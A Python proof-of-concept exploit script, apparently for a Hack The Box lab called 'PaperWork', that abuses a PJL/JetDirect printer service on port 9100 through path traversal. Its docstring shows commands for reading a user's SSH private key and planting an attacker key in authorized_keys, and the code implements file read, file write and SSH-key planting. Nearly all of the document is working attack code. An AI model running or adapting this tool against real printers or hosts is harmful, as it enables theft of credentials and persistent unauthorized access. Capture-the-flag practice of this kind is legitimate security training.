#!/usr/bin/env python3
"""
PaperWork (HTB) - stage 2: JetDirect / PJL filesystem abuse on 127.0.0.1:9100.

Start it from the `lp` shell (the service only listens on loopback):

    python3 poc_pjl_r3by5.py info
    python3 poc_pjl_r3by5.py dir  --path '0:/'
    python3 poc_pjl_r3by5.py dir  --path '0:/../'
    python3 poc_pjl_r3by5.py read --path '0:/../.ssh/id_ed25519'
    python3 poc_pjl_r3by5.py write --path '0:/../.ssh/authorized_keys' --file mykey.pub
    python3 poc_pjl_r3by5.py putkey --key mykey.pub

Why it works (jetdirect.py):

    def _translate(self, path):
        clean = path.replace("0:", "").replace("\\\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean))   # no containment check

`_root` is /home/archivist/printer, so "../" escapes it. The process runs as
archivist, therefore FSDOWNLOAD can rewrite ~/.ssh/authorized_keys.

Implementation detail that matters: the FSDOWNLOAD handler reads the header
line first and then reads exactly SIZE bytes. Send the header and the payload
as two separate writes (this client does) or the body can be swallowed by the
line parser and you end up with a zero-byte file.
"""

import argparse
import os
import socket
import sys
import time

UEL = b"\x1b%-12345X"
FF = b"\x0c"


class PJL:
    def __init__(self, host="127.0.0.1", port=9100, timeout=4.0):
        self.host = host
        self.port = port
        self.timeout = timeout

    def _connect(self):
        sock = socket.create_connection((self.host, self.port), self.timeout)
        sock.settimeout(self.timeout)
        return sock

    @staticmethod
    def _drain(sock, first_timeout=4.0, idle_timeout=0.6):
        buf = b""
        sock.settimeout(first_timeout)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
                if FF in chunk:            # end-of-response marker
                    sock.settimeout(idle_timeout)
                    try:
                        while True:
                            more = sock.recv(4096)
                            if not more:
                                break
                            buf += more
                    except socket.timeout:
                        pass
                    break
                sock.settimeout(idle_timeout)
        except socket.timeout:
            pass
        return buf

    def command(self, body, timeout=None):
        if isinstance(body, str):
            body = body.encode()
        payload = UEL + b"@PJL\r\n" + body + b"\r\n" + UEL + b"\r\n"
        sock = self._connect()
        try:
            sock.sendall(payload)
            return self._drain(sock, timeout or self.timeout)
        finally:
            sock.close()

    def download(self, path, data, split_delay=0.25):
        header = (
            '@PJL FSDOWNLOAD FORMAT:BINARY NAME="%s" SIZE=%d\r\n' % (path, len(data))
        ).encode()
        sock = self._connect()
        try:
            sock.sendall(UEL + b"@PJL\r\n" + header)
            time.sleep(split_delay)          # keep header and body in separate reads
            if data:
                sock.sendall(data)
            time.sleep(split_delay)
            sock.sendall(UEL + b"\r\n")
            return self._drain(sock)
        finally:
            sock.close()


def clean(raw, echo=None):
    """Strip PJL framing and the server's echo of the command we sent."""
    raw = raw.replace(UEL, b"")
    raw = raw.replace(FF, b"")
    text = raw.decode("latin-1")
    lines = [ln.rstrip("\r") for ln in text.split("\n")]
    lines = [ln for ln in lines if ln and ln.strip().upper() != "@PJL"]
    if echo and lines and lines[0].strip().upper() == echo.encode().strip().upper().decode("latin-1"):
        lines = lines[1:]
    return "\n".join(lines)


def cmd_info(args):
    client = PJL(args.host, args.port, args.timeout)
    for query in ("INFO ID", "INFO STATUS", "INFO FILESYS", "INFO MEMORY"):
        print("=== @PJL %s ===" % query)
        print(clean(client.command("@PJL " + query), "@PJL " + query) or "<no data>")
        print()


def cmd_dir(args):
    client = PJL(args.host, args.port, args.timeout)
    body = '@PJL FSDIRLIST NAME="%s" ENTRY=1 COUNT=%d' % (args.path, args.count)
    print(clean(client.command(body), body) or "<no data>")


def cmd_read(args):
    client = PJL(args.host, args.port, args.timeout)
    body = '@PJL FSUPLOAD NAME="%s" OFFSET=0 SIZE=%d' % (args.path, args.size)
    data = clean(client.command(body), body)
    if args.out:
        with open(args.out, "w", encoding="latin-1") as fh:
            fh.write(data)
        print("[+] wrote %d bytes to %s" % (len(data), args.out))
    else:
        print(data or "<no data>")


def read_file_via_pjl(args, path, size=65536):
    client = PJL(args.host, args.port, args.timeout)
    body = '@PJL FSUPLOAD NAME="%s" OFFSET=0 SIZE=%d' % (path, size)
    return clean(client.command(body), body)


def cmd_write(args):
    if args.file == "-":
        data = sys.stdin.buffer.read()
    else:
        with open(args.file, "rb") as fh:
            data = fh.read()
    client = PJL(args.host, args.port, args.timeout)
    reply = clean(client.download(args.path, data))
    print("[+] sent %d bytes to %s" % (len(data), args.path))
    if reply:
        print("    reply: %s" % reply.replace("\n", " ")[:200])


def cmd_putkey(args):
    with open(args.key, "rb") as fh:
        pub = fh.read()
    if not pub.endswith(b"\n"):
        pub += b"\n"
    target = args.path
    if args.append:
        existing = read_file_via_pjl(args, target)
        if existing and "FILEERROR" not in existing:
            pub = existing.encode("latin-1").rstrip(b"\r\n") + b"\n" + pub
            print("[*] preserved %d existing byte(s) of %s" % (len(existing), target))
    client = PJL(args.host, args.port, args.timeout)
    reply = clean(client.download(target, pub))
    print("[+] wrote %d bytes to %s" % (len(pub), target))
    if reply:
        print("    reply: %s" % reply.replace("\n", " ")[:200])
    print("[*] now: ssh -i %s archivist@<target>" % os.path.splitext(args.key)[0])


def cmd_raw(args):
    client = PJL(args.host, args.port, args.timeout)
    print(clean(client.command(args.body), args.body) or "<no data>")


def main(argv=None):
    p = argparse.ArgumentParser(description="PaperWork PJL/JetDirect filesystem client")
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=9100)
    p.add_argument("--timeout", type=float, default=4.0)
    sub = p.add_subparsers(dest="action", required=True)

    s = sub.add_parser("info", help="INFO ID/STATUS/FILESYS/MEMORY")
    s.set_defaults(func=cmd_info)

    s = sub.add_parser("dir", help="FSDIRLIST")
    s.add_argument("--path", default="0:/")
    s.add_argument("--count", type=int, default=200)
    s.set_defaults(func=cmd_dir)

    s = sub.add_parser("read", help="FSUPLOAD a file (traversal allowed)")
    s.add_argument("--path", required=True)
    s.add_argument("--size", type=int, default=65536)
    s.add_argument("--out")
    s.set_defaults(func=cmd_read)

    s = sub.add_parser("write", help="FSDOWNLOAD arbitrary data to a path")
    s.add_argument("--path", required=True)
    s.add_argument("--file", required=True, help="local file, or - for stdin")
    s.set_defaults(func=cmd_write)

    s = sub.add_parser("putkey", help="write an SSH pubkey to authorized_keys")
    s.add_argument("--key", required=True)
    s.add_argument("--path", default="0:/../.ssh/authorized_keys")
    s.add_argument("--append", action="store_true", help="keep existing authorized_keys")
    s.set_defaults(func=cmd_putkey)

    s = sub.add_parser("raw", help="send an arbitrary PJL body")
    s.add_argument("body")
    s.set_defaults(func=cmd_raw)

    args = p.parse_args(argv)
    try:
        args.func(args)
    except (OSError, ValueError) as exc:
        print("[-] %s" % exc, file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
